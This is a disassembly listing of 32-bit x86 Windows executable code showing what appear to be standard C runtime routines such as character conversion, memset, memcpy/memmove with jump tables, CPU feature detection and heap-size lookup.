  409549:	mov    WORD PTR [ebp-0x4],bx
  40954d:	call   0x4046cb
  409552:	add    esp,0xc
  409555:	mov    DWORD PTR [ebp-0x4],eax
  409558:	cmp    DWORD PTR [ebp-0x4],edi
  40955b:	je     0x409568
  40955d:	or     DWORD PTR [esi+0xc],0x20
  409561:	mov    eax,0xffff
  409566:	jmp    0x40956f
  409568:	mov    eax,ebx
  40956a:	and    eax,0xffff
  40956f:	pop    edi
  409570:	pop    ebx
  409571:	pop    esi
  409572:	leave  
  409573:	ret    
  409574:	mov    edi,edi
  409576:	push   ebp
  409577:	mov    ebp,esp
  409579:	sub    esp,0x10
  40957c:	push   ebx
  40957d:	push   esi
  40957e:	mov    esi,DWORD PTR [ebp+0xc]
  409581:	xor    ebx,ebx
  409583:	push   edi
  409584:	mov    edi,DWORD PTR [ebp+0x10]
  409587:	cmp    esi,ebx
  409589:	jne    0x40959f
  40958b:	cmp    edi,ebx
  40958d:	jbe    0x40959f
  40958f:	mov    eax,DWORD PTR [ebp+0x8]
  409592:	cmp    eax,ebx
  409594:	je     0x409598
  409596:	mov    DWORD PTR [eax],ebx
  409598:	xor    eax,eax
  40959a:	jmp    0x409622
  40959f:	mov    eax,DWORD PTR [ebp+0x8]
  4095a2:	cmp    eax,ebx
  4095a4:	je     0x4095a9
  4095a6:	or     DWORD PTR [eax],0xffffffff
  4095a9:	cmp    edi,0x7fffffff
  4095af:	jbe    0x4095cc
  4095b1:	call   0x4024b6
  4095b6:	push   0x16
  4095b8:	pop    esi
  4095b9:	push   ebx
  4095ba:	push   ebx
  4095bb:	push   ebx
  4095bc:	push   ebx
  4095bd:	push   ebx
  4095be:	mov    DWORD PTR [eax],esi
  4095c0:	call   0x40244e
  4095c5:	add    esp,0x14
  4095c8:	mov    eax,esi
  4095ca:	jmp    0x409622
  4095cc:	push   DWORD PTR [ebp+0x18]
  4095cf:	lea    ecx,[ebp-0x10]
  4095d2:	call   0x402290
  4095d7:	mov    eax,DWORD PTR [ebp-0x10]
  4095da:	cmp    DWORD PTR [eax+0x14],ebx
  4095dd:	jne    0x40967f
  4095e3:	mov    ax,WORD PTR [ebp+0x14]
  4095e7:	mov    ecx,0xff
  4095ec:	cmp    ax,cx
  4095ef:	jbe    0x409627
  4095f1:	cmp    esi,ebx
  4095f3:	je     0x409604
  4095f5:	cmp    edi,ebx
  4095f7:	jbe    0x409604
  4095f9:	push   edi
  4095fa:	push   ebx
  4095fb:	push   esi
  4095fc:	call   0x4058c0
  409601:	add    esp,0xc
  409604:	call   0x4024b6
  409609:	mov    DWORD PTR [eax],0x2a
  40960f:	call   0x4024b6
  409614:	mov    eax,DWORD PTR [eax]
  409616:	cmp    BYTE PTR [ebp-0x4],bl
  409619:	je     0x409622
  40961b:	mov    ecx,DWORD PTR [ebp-0x8]
  40961e:	and    DWORD PTR [ecx+0x70],0xfffffffd
  409622:	pop    edi
  409623:	pop    esi
  409624:	pop    ebx
  409625:	leave  
  409626:	ret    
  409627:	cmp    esi,ebx
  409629:	je     0x40965d
  40962b:	cmp    edi,ebx
  40962d:	ja     0x40965b
  40962f:	call   0x4024b6
  409634:	push   0x22
  409636:	pop    esi
  409637:	push   ebx
  409638:	push   ebx
  409639:	push   ebx
  40963a:	push   ebx
  40963b:	push   ebx
  40963c:	mov    DWORD PTR [eax],esi
  40963e:	call   0x40244e
  409643:	add    esp,0x14
  409646:	cmp    BYTE PTR [ebp-0x4],bl
  409649:	je     0x4095c8
  40964f:	mov    eax,DWORD PTR [ebp-0x8]
  409652:	and    DWORD PTR [eax+0x70],0xfffffffd
  409656:	jmp    0x4095c8
  40965b:	mov    BYTE PTR [esi],al
  40965d:	mov    eax,DWORD PTR [ebp+0x8]
  409660:	cmp    eax,ebx
  409662:	je     0x40966a
  409664:	mov    DWORD PTR [eax],0x1
  40966a:	cmp    BYTE PTR [ebp-0x4],bl
  40966d:	je     0x409598
  409673:	mov    eax,DWORD PTR [ebp-0x8]
  409676:	and    DWORD PTR [eax+0x70],0xfffffffd
  40967a:	jmp    0x409598
  40967f:	lea    ecx,[ebp+0xc]
  409682:	push   ecx
  409683:	push   ebx
  409684:	push   edi
  409685:	push   esi
  409686:	push   0x1
  409688:	lea    ecx,[ebp+0x14]
  40968b:	push   ecx
  40968c:	push   ebx
  40968d:	mov    DWORD PTR [ebp+0xc],ebx
  409690:	push   DWORD PTR [eax+0x4]
  409693:	call   DWORD PTR ds:0x40b124
  409699:	cmp    eax,ebx
  40969b:	je     0x4096b1
  40969d:	cmp    DWORD PTR [ebp+0xc],ebx
  4096a0:	jne    0x409604
  4096a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4096a9:	cmp    ecx,ebx
  4096ab:	je     0x40966a
  4096ad:	mov    DWORD PTR [ecx],eax
  4096af:	jmp    0x40966a
  4096b1:	call   DWORD PTR ds:0x40b08c
  4096b7:	cmp    eax,0x7a
  4096ba:	jne    0x409604
  4096c0:	cmp    esi,ebx
  4096c2:	je     0x40962f
  4096c8:	cmp    edi,ebx
  4096ca:	jbe    0x40962f
  4096d0:	push   edi
  4096d1:	push   ebx
  4096d2:	push   esi
  4096d3:	call   0x4058c0
  4096d8:	add    esp,0xc
  4096db:	jmp    0x40962f
  4096e0:	mov    edi,edi
  4096e2:	push   ebp
  4096e3:	mov    ebp,esp
  4096e5:	push   0x0
  4096e7:	push   DWORD PTR [ebp+0x14]
  4096ea:	push   DWORD PTR [ebp+0x10]
  4096ed:	push   DWORD PTR [ebp+0xc]
  4096f0:	push   DWORD PTR [ebp+0x8]
  4096f3:	call   0x409574
  4096f8:	add    esp,0x14
  4096fb:	pop    ebp
  4096fc:	ret    
  4096fd:	push   0x2
  4096ff:	call   0x402937
  409704:	pop    ecx
  409705:	ret    
  409706:	push   ebp
  409707:	mov    ebp,esp
  409709:	sub    esp,0x4
  40970c:	mov    DWORD PTR [ebp-0x4],edi
  40970f:	mov    edi,DWORD PTR [ebp+0x8]
  409712:	mov    ecx,DWORD PTR [ebp+0xc]
  409715:	shr    ecx,0x7
  409718:	pxor   xmm0,xmm0
  40971c:	jmp    0x409726
  40971e:	lea    esp,[esp+0x0]
  409725:	nop
  409726:	movdqa XMMWORD PTR [edi],xmm0
  40972a:	movdqa XMMWORD PTR [edi+0x10],xmm0
  40972f:	movdqa XMMWORD PTR [edi+0x20],xmm0
  409734:	movdqa XMMWORD PTR [edi+0x30],xmm0
  409739:	movdqa XMMWORD PTR [edi+0x40],xmm0
  40973e:	movdqa XMMWORD PTR [edi+0x50],xmm0
  409743:	movdqa XMMWORD PTR [edi+0x60],xmm0
  409748:	movdqa XMMWORD PTR [edi+0x70],xmm0
  40974d:	lea    edi,[edi+0x80]
  409753:	dec    ecx
  409754:	jne    0x409726
  409756:	mov    edi,DWORD PTR [ebp-0x4]
  409759:	mov    esp,ebp
  40975b:	pop    ebp
  40975c:	ret    
  40975d:	push   ebp
  40975e:	mov    ebp,esp
  409760:	sub    esp,0x10
  409763:	mov    DWORD PTR [ebp-0x4],edi
  409766:	mov    eax,DWORD PTR [ebp+0x8]
  409769:	cdq    
  40976a:	mov    edi,eax
  40976c:	xor    edi,edx
  40976e:	sub    edi,edx
  409770:	and    edi,0xf
  409773:	xor    edi,edx
  409775:	sub    edi,edx
  409777:	test   edi,edi
  409779:	jne    0x4097b7
  40977b:	mov    ecx,DWORD PTR [ebp+0x10]
  40977e:	mov    edx,ecx
  409780:	and    edx,0x7f
  409783:	mov    DWORD PTR [ebp-0xc],edx
  409786:	cmp    ecx,edx
  409788:	je     0x40979c
  40978a:	sub    ecx,edx
  40978c:	push   ecx
  40978d:	push   eax
  40978e:	call   0x409706
  409793:	add    esp,0x8
  409796:	mov    eax,DWORD PTR [ebp+0x8]
  409799:	mov    edx,DWORD PTR [ebp-0xc]
  40979c:	test   edx,edx
  40979e:	je     0x4097e5
  4097a0:	add    eax,DWORD PTR [ebp+0x10]
  4097a3:	sub    eax,edx
  4097a5:	mov    DWORD PTR [ebp-0x8],eax
  4097a8:	xor    eax,eax
  4097aa:	mov    edi,DWORD PTR [ebp-0x8]
  4097ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4097b0:	rep stos BYTE PTR es:[edi],al
  4097b2:	mov    eax,DWORD PTR [ebp+0x8]
  4097b5:	jmp    0x4097e5
  4097b7:	neg    edi
  4097b9:	add    edi,0x10
  4097bc:	mov    DWORD PTR [ebp-0x10],edi
  4097bf:	xor    eax,eax
  4097c1:	mov    edi,DWORD PTR [ebp+0x8]
  4097c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4097c7:	rep stos BYTE PTR es:[edi],al
  4097c9:	mov    eax,DWORD PTR [ebp-0x10]
  4097cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4097cf:	mov    edx,DWORD PTR [ebp+0x10]
  4097d2:	add    ecx,eax
  4097d4:	sub    edx,eax
  4097d6:	push   edx
  4097d7:	push   0x0
  4097d9:	push   ecx
  4097da:	call   0x40975d
  4097df:	add    esp,0xc
  4097e2:	mov    eax,DWORD PTR [ebp+0x8]
  4097e5:	mov    edi,DWORD PTR [ebp-0x4]
  4097e8:	mov    esp,ebp
  4097ea:	pop    ebp
  4097eb:	ret    
  4097ec:	push   0xc
  4097ee:	push   0x40ca20
  4097f3:	call   0x403b74
  4097f8:	and    DWORD PTR [ebp-0x4],0x0
  4097fc:	movapd xmm0,xmm1
  409800:	mov    DWORD PTR [ebp-0x1c],0x1
  409807:	jmp    0x40982c
  409809:	mov    eax,DWORD PTR [ebp-0x14]
  40980c:	mov    eax,DWORD PTR [eax]
  40980e:	mov    eax,DWORD PTR [eax]
  409810:	cmp    eax,0xc0000005
  409815:	je     0x409821
  409817:	cmp    eax,0xc000001d
  40981c:	je     0x409821
  40981e:	xor    eax,eax
  409820:	ret    
  409821:	xor    eax,eax
  409823:	inc    eax
  409824:	ret    
  409825:	mov    esp,DWORD PTR [ebp-0x18]
  409828:	and    DWORD PTR [ebp-0x1c],0x0
  40982c:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  409833:	mov    eax,DWORD PTR [ebp-0x1c]
  409836:	call   0x403bb9
  40983b:	ret    
  40983c:	mov    edi,edi
  40983e:	push   ebp
  40983f:	mov    ebp,esp
  409841:	sub    esp,0x18
  409844:	xor    eax,eax
  409846:	push   ebx
  409847:	mov    DWORD PTR [ebp-0x4],eax
  40984a:	mov    DWORD PTR [ebp-0xc],eax
  40984d:	mov    DWORD PTR [ebp-0x8],eax
  409850:	push   ebx
  409851:	pushf  
  409852:	pop    eax
  409853:	mov    ecx,eax
  409855:	xor    eax,0x200000
  40985a:	push   eax
  40985b:	popf   
  40985c:	pushf  
  40985d:	pop    edx
  40985e:	sub    edx,ecx
  409860:	je     0x409881
  409862:	push   ecx
  409863:	popf   
  409864:	xor    eax,eax
  409866:	cpuid  
  409868:	mov    DWORD PTR [ebp-0xc],eax
  40986b:	mov    DWORD PTR [ebp-0x18],ebx
  40986e:	mov    DWORD PTR [ebp-0x14],edx
  409871:	mov    DWORD PTR [ebp-0x10],ecx
  409874:	mov    eax,0x1
  409879:	cpuid  
  40987b:	mov    DWORD PTR [ebp-0x4],edx
  40987e:	mov    DWORD PTR [ebp-0x8],eax
  409881:	pop    ebx
  409882:	test   DWORD PTR [ebp-0x4],0x4000000
  409889:	je     0x409899
  40988b:	call   0x4097ec
  409890:	test   eax,eax
  409892:	je     0x409899
  409894:	xor    eax,eax
  409896:	inc    eax
  409897:	jmp    0x40989b
  409899:	xor    eax,eax
  40989b:	pop    ebx
  40989c:	leave  
  40989d:	ret    
  40989e:	call   0x40983c
  4098a3:	mov    ds:0x411408,eax
  4098a8:	xor    eax,eax
  4098aa:	ret    
  4098ab:	int3   
  4098ac:	int3   
  4098ad:	int3   
  4098ae:	int3   
  4098af:	int3   
  4098b0:	push   ebp
  4098b1:	mov    ebp,esp
  4098b3:	push   edi
  4098b4:	push   esi
  4098b5:	mov    esi,DWORD PTR [ebp+0xc]
  4098b8:	mov    ecx,DWORD PTR [ebp+0x10]
  4098bb:	mov    edi,DWORD PTR [ebp+0x8]
  4098be:	mov    eax,ecx
  4098c0:	mov    edx,ecx
  4098c2:	add    eax,esi
  4098c4:	cmp    edi,esi
  4098c6:	jbe    0x4098d0
  4098c8:	cmp    edi,eax
  4098ca:	jb     0x409a74
  4098d0:	cmp    ecx,0x100
  4098d6:	jb     0x4098f7
  4098d8:	cmp    DWORD PTR ds:0x411408,0x0
  4098df:	je     0x4098f7
  4098e1:	push   edi
  4098e2:	push   esi
  4098e3:	and    edi,0xf
  4098e6:	and    esi,0xf
  4098e9:	cmp    edi,esi
  4098eb:	pop    esi
  4098ec:	pop    edi
  4098ed:	jne    0x4098f7
  4098ef:	pop    esi
  4098f0:	pop    edi
  4098f1:	pop    ebp
  4098f2:	jmp    0x409e94
  4098f7:	test   edi,0x3
  4098fd:	jne    0x409914
  4098ff:	shr    ecx,0x2
  409902:	and    edx,0x3
  409905:	cmp    ecx,0x8
  409908:	jb     0x409934
  40990a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40990c:	jmp    DWORD PTR [edx*4+0x409a24]
  409913:	nop
  409914:	mov    eax,edi
  409916:	mov    edx,0x3
  40991b:	sub    ecx,0x4
  40991e:	jb     0x40992c
  409920:	and    eax,0x3
  409923:	add    ecx,eax
  409925:	jmp    DWORD PTR [eax*4+0x409938]
  40992c:	jmp    DWORD PTR [ecx*4+0x409a34]
  409933:	nop
  409934:	jmp    DWORD PTR [ecx*4+0x4099b8]
  40993b:	nop
  40993c:	dec    eax
  40993d:	cdq    
  40993e:	inc    eax
  40993f:	add    BYTE PTR [ecx+ebx*4+0x40],dh
  409943:	add    BYTE PTR [eax+0x23004099],bl
  409949:	ror    DWORD PTR [edx-0x75f877fa],1
  40994f:	inc    esi
  409950:	add    DWORD PTR [eax+0x468a0147],ecx
  409956:	add    al,cl
  409958:	jmp    0x288215f
  40995d:	add    esi,0x3
  409960:	add    edi,0x3
  409963:	cmp    ecx,0x8
  409966:	jb     0x409934
  409968:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40996a:	jmp    DWORD PTR [edx*4+0x409a24]
  409971:	lea    ecx,[ecx+0x0]
  409974:	and    edx,ecx
  409976:	mov    al,BYTE PTR [esi]
  409978:	mov    BYTE PTR [edi],al
  40997a:	mov    al,BYTE PTR [esi+0x1]
  40997d:	shr    ecx,0x2
  409980:	mov    BYTE PTR [edi+0x1],al
  409983:	add    esi,0x2
  409986:	add    edi,0x2
  409989:	cmp    ecx,0x8
  40998c:	jb     0x409934
  40998e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409990:	jmp    DWORD PTR [edx*4+0x409a24]
  409997:	nop
  409998:	and    edx,ecx
  40999a:	mov    al,BYTE PTR [esi]
  40999c:	mov    BYTE PTR [edi],al
  40999e:	add    esi,0x1
  4099a1:	shr    ecx,0x2
  4099a4:	add    edi,0x1
  4099a7:	cmp    ecx,0x8
  4099aa:	jb     0x409934
  4099ac:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099ae:	jmp    DWORD PTR [edx*4+0x409a24]
  4099b5:	lea    ecx,[ecx+0x0]
  4099b8:	sbb    ebx,DWORD PTR [edx-0x65f7ffc0]
  4099be:	inc    eax
  4099bf:	add    BYTE PTR [eax],al
  4099c1:	call   0x40:0x99f80040
  4099c8:	lock cdq 
  4099ca:	inc    eax
  4099cb:	add    al,ch
  4099cd:	cdq    
  4099ce:	inc    eax
  4099cf:	add    al,ah
  4099d1:	cdq    
  4099d2:	inc    eax
  4099d3:	add    al,bl
  4099d5:	cdq    
  4099d6:	inc    eax
  4099d7:	add    BYTE PTR [ebx-0x761b71bc],cl
  4099dd:	inc    esp
  4099de:	(bad)  
  4099df:	in     al,0x8b
  4099e1:	inc    esp
  4099e2:	mov    gs,eax
  4099e4:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4099e8:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4099ec:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4099f0:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4099f4:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4099f8:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4099fc:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  409a00:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  409a04:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  409a08:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  409a0c:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  409a10:	lea    eax,[ecx*4+0x0]
  409a17:	add    esi,eax
  409a19:	add    edi,eax
  409a1b:	jmp    DWORD PTR [edx*4+0x409a24]
  409a22:	mov    edi,edi
  409a24:	xor    al,0x9a
  409a26:	inc    eax
  409a27:	add    BYTE PTR [edx+ebx*4],bh
  409a2a:	inc    eax
  409a2b:	add    BYTE PTR [eax-0x66],cl
  409a2e:	inc    eax
  409a2f:	add    BYTE PTR [edx+ebx*4+0x40],bl
  409a33:	add    BYTE PTR [ebx+0x5f5e0845],cl
  409a39:	leave  
  409a3a:	ret    
  409a3b:	nop
  409a3c:	mov    al,BYTE PTR [esi]
  409a3e:	mov    BYTE PTR [edi],al
  409a40:	mov    eax,DWORD PTR [ebp+0x8]
  409a43:	pop    esi
  409a44:	pop    edi
  409a45:	leave  
  409a46:	ret    
  409a47:	nop
  409a48:	mov    al,BYTE PTR [esi]
  409a4a:	mov    BYTE PTR [edi],al
  409a4c:	mov    al,BYTE PTR [esi+0x1]
  409a4f:	mov    BYTE PTR [edi+0x1],al
  409a52:	mov    eax,DWORD PTR [ebp+0x8]
  409a55:	pop    esi
  409a56:	pop    edi
  409a57:	leave  
  409a58:	ret    
  409a59:	lea    ecx,[ecx+0x0]
  409a5c:	mov    al,BYTE PTR [esi]
  409a5e:	mov    BYTE PTR [edi],al
  409a60:	mov    al,BYTE PTR [esi+0x1]
  409a63:	mov    BYTE PTR [edi+0x1],al
  409a66:	mov    al,BYTE PTR [esi+0x2]
  409a69:	mov    BYTE PTR [edi+0x2],al
  409a6c:	mov    eax,DWORD PTR [ebp+0x8]
  409a6f:	pop    esi
  409a70:	pop    edi
  409a71:	leave  
  409a72:	ret    
  409a73:	nop
  409a74:	lea    esi,[ecx+esi*1-0x4]
  409a78:	lea    edi,[ecx+edi*1-0x4]
  409a7c:	test   edi,0x3
  409a82:	jne    0x409aa8
  409a84:	shr    ecx,0x2
  409a87:	and    edx,0x3
  409a8a:	cmp    ecx,0x8
  409a8d:	jb     0x409a9c
  409a8f:	std    
  409a90:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a92:	cld    
  409a93:	jmp    DWORD PTR [edx*4+0x409bc0]
  409a9a:	mov    edi,edi
  409a9c:	neg    ecx
  409a9e:	jmp    DWORD PTR [ecx*4+0x409b70]
  409aa5:	lea    ecx,[ecx+0x0]
  409aa8:	mov    eax,edi
  409aaa:	mov    edx,0x3
  409aaf:	cmp    ecx,0x4
  409ab2:	jb     0x409ac0
  409ab4:	and    eax,0x3
  409ab7:	sub    ecx,eax
  409ab9:	jmp    DWORD PTR [eax*4+0x409ac4]
  409ac0:	jmp    DWORD PTR [ecx*4+0x409bc0]
  409ac7:	nop
  409ac8:	aam    0x9a
  409aca:	inc    eax
  409acb:	add    al,bh
  409acd:	call   0x40:0x9b200040
  409ad4:	mov    al,BYTE PTR [esi+0x3]
  409ad7:	and    edx,ecx
  409ad9:	mov    BYTE PTR [edi+0x3],al
  409adc:	sub    esi,0x1
  409adf:	shr    ecx,0x2
  409ae2:	sub    edi,0x1
  409ae5:	cmp    ecx,0x8
  409ae8:	jb     0x409a9c
  409aea:	std    
  409aeb:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409aed:	cld    
  409aee:	jmp    DWORD PTR [edx*4+0x409bc0]
  409af5:	lea    ecx,[ecx+0x0]
  409af8:	mov    al,BYTE PTR [esi+0x3]
  409afb:	and    edx,ecx
  409afd:	mov    BYTE PTR [edi+0x3],al
  409b00:	mov    al,BYTE PTR [esi+0x2]
  409b03:	shr    ecx,0x2
  409b06:	mov    BYTE PTR [edi+0x2],al
  409b09:	sub    esi,0x2
  409b0c:	sub    edi,0x2
  409b0f:	cmp    ecx,0x8
  409b12:	jb     0x409a9c
  409b14:	std    
  409b15:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b17:	cld    
  409b18:	jmp    DWORD PTR [edx*4+0x409bc0]
  409b1f:	nop
  409b20:	mov    al,BYTE PTR [esi+0x3]
  409b23:	and    edx,ecx
  409b25:	mov    BYTE PTR [edi+0x3],al
  409b28:	mov    al,BYTE PTR [esi+0x2]
  409b2b:	mov    BYTE PTR [edi+0x2],al
  409b2e:	mov    al,BYTE PTR [esi+0x1]
  409b31:	shr    ecx,0x2
  409b34:	mov    BYTE PTR [edi+0x1],al
  409b37:	sub    esi,0x3
  409b3a:	sub    edi,0x3
  409b3d:	cmp    ecx,0x8
  409b40:	jb     0x409a9c
  409b46:	std    
  409b47:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b49:	cld    
  409b4a:	jmp    DWORD PTR [edx*4+0x409bc0]
  409b51:	lea    ecx,[ecx+0x0]
  409b54:	je     0x409af1
  409b56:	inc    eax
  409b57:	add    BYTE PTR [ebx+ebx*4+0x40],bh
  409b5b:	add    BYTE PTR [ebx+ebx*4-0x6473ffc0],al
  409b62:	inc    eax
  409b63:	add    BYTE PTR [ebx+ebx*4-0x6463ffc0],dl
  409b6a:	inc    eax
  409b6b:	add    BYTE PTR [ebx+ebx*4-0x6448ffc0],ah
  409b72:	inc    eax
  409b73:	add    BYTE PTR [ebx-0x76e371bc],cl
  409b79:	inc    esp
  409b7a:	(bad)  
  409b7b:	sbb    al,0x8b
  409b7d:	inc    esp
  409b7e:	mov    ds,WORD PTR [eax]
  409b80:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  409b84:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  409b88:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  409b8c:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  409b90:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  409b94:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  409b98:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  409b9c:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  409ba0:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  409ba4:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  409ba8:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  409bac:	lea    eax,[ecx*4+0x0]
  409bb3:	add    esi,eax
  409bb5:	add    edi,eax
  409bb7:	jmp    DWORD PTR [edx*4+0x409bc0]
  409bbe:	mov    edi,edi
  409bc0:	rcr    BYTE PTR [ebx-0x6427ffc0],1
  409bc6:	inc    eax
  409bc7:	add    al,ch
  409bc9:	fwait
  409bca:	inc    eax
  409bcb:	add    ah,bh
  409bcd:	fwait
  409bce:	inc    eax
  409bcf:	add    BYTE PTR [ebx+0x5f5e0845],cl
  409bd5:	leave  
  409bd6:	ret    
  409bd7:	nop
  409bd8:	mov    al,BYTE PTR [esi+0x3]
  409bdb:	mov    BYTE PTR [edi+0x3],al
  409bde:	mov    eax,DWORD PTR [ebp+0x8]
  409be1:	pop    esi
  409be2:	pop    edi
  409be3:	leave  
  409be4:	ret    
  409be5:	lea    ecx,[ecx+0x0]
  409be8:	mov    al,BYTE PTR [esi+0x3]
  409beb:	mov    BYTE PTR [edi+0x3],al
  409bee:	mov    al,BYTE PTR [esi+0x2]
  409bf1:	mov    BYTE PTR [edi+0x2],al
  409bf4:	mov    eax,DWORD PTR [ebp+0x8]
  409bf7:	pop    esi
  409bf8:	pop    edi
  409bf9:	leave  
  409bfa:	ret    
  409bfb:	nop
  409bfc:	mov    al,BYTE PTR [esi+0x3]
  409bff:	mov    BYTE PTR [edi+0x3],al
  409c02:	mov    al,BYTE PTR [esi+0x2]
  409c05:	mov    BYTE PTR [edi+0x2],al
  409c08:	mov    al,BYTE PTR [esi+0x1]
  409c0b:	mov    BYTE PTR [edi+0x1],al
  409c0e:	mov    eax,DWORD PTR [ebp+0x8]
  409c11:	pop    esi
  409c12:	pop    edi
  409c13:	leave  
  409c14:	ret    
  409c15:	mov    edi,edi
  409c17:	push   ebp
  409c18:	mov    ebp,esp
  409c1a:	sub    esp,0x10
  409c1d:	push   DWORD PTR [ebp+0x8]
  409c20:	lea    ecx,[ebp-0x10]
  409c23:	call   0x402290
  409c28:	cmp    DWORD PTR [ebp+0x14],0xffffffff
  409c2c:	jge    0x409c32
  409c2e:	xor    eax,eax
  409c30:	jmp    0x409c44
  409c32:	push   DWORD PTR [ebp+0x18]
  409c35:	push   DWORD PTR [ebp+0x14]
  409c38:	push   DWORD PTR [ebp+0x10]
  409c3b:	push   DWORD PTR [ebp+0xc]
  409c3e:	call   DWORD PTR ds:0x40b044
  409c44:	cmp    BYTE PTR [ebp-0x4],0x0
  409c48:	je     0x409c51
  409c4a:	mov    ecx,DWORD PTR [ebp-0x8]
  409c4d:	and    DWORD PTR [ecx+0x70],0xfffffffd
  409c51:	leave  
  409c52:	ret    
  409c53:	push   0x10
  409c55:	push   0x40ca40
  409c5a:	call   0x403b74
  409c5f:	xor    eax,eax
  409c61:	mov    ebx,DWORD PTR [ebp+0x8]
  409c64:	xor    edi,edi
  409c66:	cmp    ebx,edi
  409c68:	setne  al
  409c6b:	cmp    eax,edi
  409c6d:	jne    0x409c8c
  409c6f:	call   0x4024b6
  409c74:	mov    DWORD PTR [eax],0x16
  409c7a:	push   edi
  409c7b:	push   edi
  409c7c:	push   edi
  409c7d:	push   edi
  409c7e:	push   edi
  409c7f:	call   0x40244e
  409c84:	add    esp,0x14
  409c87:	or     eax,0xffffffff
  409c8a:	jmp    0x409cdf
  409c8c:	cmp    DWORD PTR ds:0x41244c,0x3
  409c93:	jne    0x409ccd
  409c95:	push   0x4
  409c97:	call   0x4066fe
  409c9c:	pop    ecx
  409c9d:	mov    DWORD PTR [ebp-0x4],edi
  409ca0:	push   ebx
  409ca1:	call   0x406731
  409ca6:	pop    ecx
  409ca7:	mov    DWORD PTR [ebp-0x20],eax
  409caa:	cmp    eax,edi
  409cac:	je     0x409cb9
  409cae:	mov    esi,DWORD PTR [ebx-0x4]
  409cb1:	sub    esi,0x9
  409cb4:	mov    DWORD PTR [ebp-0x1c],esi
  409cb7:	jmp    0x409cbc
  409cb9:	mov    esi,DWORD PTR [ebp-0x1c]
  409cbc:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  409cc3:	call   0x409ced
  409cc8:	cmp    DWORD PTR [ebp-0x20],edi
  409ccb:	jne    0x409cdd
  409ccd:	push   ebx
  409cce:	push   edi
  409ccf:	push   DWORD PTR ds:0x40f7b4
  409cd5:	call   DWORD PTR ds:0x40b038
  409cdb:	mov    esi,eax
  409cdd:	mov    eax,esi
  409cdf:	call   0x403bb9
  409ce4:	ret    
  409ce5:	xor    edi,edi
  409ce7:	mov    ebx,DWORD PTR [ebp+0x8]
  409cea:	mov    esi,DWORD PTR [ebp-0x1c]
  409ced:	push   0x4
  409cef:	call   0x406624
  409cf4:	pop    ecx
  409cf5:	ret    
  409cf6:	mov    edi,edi
  409cf8:	push   ebp
  409cf9:	mov    ebp,esp
  409cfb:	sub    esp,0x328
  409d01:	mov    eax,ds:0x40e004
  409d06:	xor    eax,ebp
  409d08:	mov    DWORD PTR [ebp-0x4],eax
  409d0b:	test   BYTE PTR ds:0x40edb0,0x1
  409d12:	push   esi
  409d13:	je     0x409d1d
  409d15:	push   0xa
  409d17:	call   0x402c3f
  409d1c:	pop    ecx
  409d1d:	call   0x407a62
  409d22:	test   eax,eax
  409d24:	je     0x409d2e
  409d26:	push   0x16
  409d28:	call   0x407a6f
  409d2d:	pop    ecx
  409d2e:	test   BYTE PTR ds:0x40edb0,0x2
  409d35:	je     0x409e05
  409d3b:	mov    DWORD PTR [ebp-0x220],eax
  409d41:	mov    DWORD PTR [ebp-0x224],ecx
  409d47:	mov    DWORD PTR [ebp-0x228],edx
  409d4d:	mov    DWORD PTR [ebp-0x22c],ebx
  409d53:	mov    DWORD PTR [ebp-0x230],esi
  409d59:	mov    DWORD PTR [ebp-0x234],edi
  409d5f:	data16 mov WORD PTR [ebp-0x208],ss
  409d66:	data16 mov WORD PTR [ebp-0x214],cs
  409d6d:	data16 mov WORD PTR [ebp-0x238],ds
  409d74:	data16 mov WORD PTR [ebp-0x23c],es
  409d7b:	data16 mov WORD PTR [ebp-0x240],fs
  409d82:	data16 mov WORD PTR [ebp-0x244],gs
  409d89:	pushf  
  409d8a:	pop    DWORD PTR [ebp-0x210]
  409d90:	mov    esi,DWORD PTR [ebp+0x4]
  409d93:	lea    eax,[ebp+0x4]
  409d96:	mov    DWORD PTR [ebp-0x20c],eax
  409d9c:	mov    DWORD PTR [ebp-0x2d0],0x10001
  409da6:	mov    DWORD PTR [ebp-0x218],esi
  409dac:	mov    eax,DWORD PTR [eax-0x4]
  409daf:	push   0x50
  409db1:	mov    DWORD PTR [ebp-0x21c],eax
  409db7:	lea    eax,[ebp-0x328]
  409dbd:	push   0x0
  409dbf:	push   eax
  409dc0:	call   0x4058c0
  409dc5:	lea    eax,[ebp-0x328]
  409dcb:	add    esp,0xc
  409dce:	mov    DWORD PTR [ebp-0x2d8],eax
  409dd4:	lea    eax,[ebp-0x2d0]
  409dda:	push   0x0
  409ddc:	mov    DWORD PTR [ebp-0x328],0x40000015
  409de6:	mov    DWORD PTR [ebp-0x31c],esi
